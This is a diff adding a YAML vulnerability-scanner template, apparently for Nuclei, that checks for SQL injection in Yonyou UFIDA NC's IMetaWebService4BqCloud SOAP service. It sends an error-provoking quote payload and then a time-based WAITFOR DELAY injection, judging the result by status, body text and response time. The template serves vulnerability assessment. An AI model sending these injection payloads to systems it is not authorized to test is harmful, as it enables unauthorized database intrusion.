@@ -1,0 +1,73 @@
+id: poc-yaml-yonyou-ufida-nc-imetawebservice4bqcloud-sqli
+info:
+  name: 用友NC IMetaWebService4BqCloud SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,ufida-nc
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <imet:loadFields>
+                 <!--type: string-->
+                 <imet:string>SmartModel^1'</imet:string>
+              </imet:loadFields>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "Fault occurred while processing."
+          - "ufida.zior.exception"
+          - "IMetaWebService4BqCloud"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+  - raw:
+      - |
+        POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <imet:loadFields>
+                 <!--type: string-->
+                 <imet:string>SmartModel^1';WAITFOR DELAY '0:0:{{t1}}'--</imet:string>
+              </imet:loadFields>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "#UAP#"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+      - type: dsl
+        dsl:
+          - "duration > t1 && duration < t2"
